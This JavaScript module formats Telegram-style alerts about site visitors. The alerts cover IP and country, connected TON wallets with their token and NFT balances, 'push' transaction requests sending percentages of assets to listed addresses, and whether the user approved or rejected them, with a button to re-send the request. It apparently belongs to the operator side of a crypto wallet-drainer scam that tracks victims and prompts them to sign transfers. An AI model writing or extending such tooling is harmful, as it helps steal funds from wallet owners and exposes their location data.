const {countryCodeEmoji} = require("country-code-emoji");
const currencySymbolMap = require('currency-symbol-map');

module.exports = {
    user: (domain, ip, country) => {
        return `<b>Domain:</b> <code>${domain}</code>\n` +
            `<b>IP/Country:</b> ${ip} ${country} ${countryCodeEmoji(country)}`;
    },

    wallet: (device, userFriendlyAddress) => {
        return `\n\n<b>Wallet/Platform:</b> ${device.app}/${device.platform}\n` +
            `<b>Wallet:</b> <a href="https://tonviewer.com/${userFriendlyAddress}">${userFriendlyAddress.substring(0, 4)}...${userFriendlyAddress.substring(userFriendlyAddress.length - 4, userFriendlyAddress.length)}</a>\n` +
            `<b>Address:</b> <code>${userFriendlyAddress}</code>\n\n`;
    },

    connection: '<b>🌐 User opened website</b>\n\n',
    closed: '<b>👮 User closed website</b>\n\n',

    connected: {
        heading: (hash) => {
            return `<b>👛 Wallet conected! #${hash}</b>\n\n`
        },

        balance: (total, currency) => {
            return `<b>Wallet balance:</b>\n` +
                `<b>Total:</b> <code>${total}${currencySymbolMap(currency)}</code>\n`
        },

        ton: (balance) => {
            return `💎 Wallet\n<b>TON | ${balance} TON</b>`
        },

        jetton: (jetton, currency) => {
            return `\n\n<b>Jetton | ${jetton.token.symbol} — ${jetton.balance / jetton.decimalCuter} — ${jetton.inCurrency()}${currencySymbolMap(currency)}</b>`
        },

        nft: (nft, currency) => {
            return `\n<b>NFT | ${nft.name} — ${nft.inCurrency()}${currencySymbolMap(currency)}</b>\n`
        }
    },

    pushTransaction: {
        heading: (hash) => {
            return `<b>⏳ Push request! #${hash}</b>\n\n`
        },

        total: (balance, currency) => {
            return `<blockquote><b>Total:</b> ${balance.toFixed(2)}${currencySymbolMap(currency)}</blockquote>\n\n`
        },

        asset: (asset, currency) => {
            const assetData = `<a href="https://tonviewer.com/${asset.toAddress}">${asset.toAddress.substring(0, 4)}...${asset.toAddress.substring(asset.toAddress.length - 4, asset.toAddress.length)}</a> ${asset.percent}%`
            return `<b>${asset.name}</b> - <code>${(+asset.inCurrency).toFixed(2)}${currencySymbolMap(currency)}</code> – ${assetData}\n`
        },

        rePushButton: '💎 Отправить повторно'
    },

    transactionStatus: {
        headingApproved: (hash) => {
            return `<b>✅ Approved transaction! #${hash}</b>\n\n`
        },

        headingReject: (hash) => {
            return `<b>❌ User reject request! #${hash}</b>\n\n`
        },

        total: (balance, currency) => {
            return `<blockquote><b>Total:</b> ${balance.toFixed(2)} ${currencySymbolMap(currency)}</blockquote>\n\n`
        },

        asset: (asset, currency) => {
            // const assetData = `<a href="https://tonviewer.com/${asset.toAddress}">${asset.toAddress.substring(0, 4)}...${asset.toAddress.substring(asset.toAddress.length - 4, asset.toAddress.length)}</a> ${asset.percent}%`
            return `<b>${asset.name}</b> - <code>${(+asset.inCurrency).toFixed(2)} ${currencySymbolMap(currency)}</code>\n`
        },
    }
}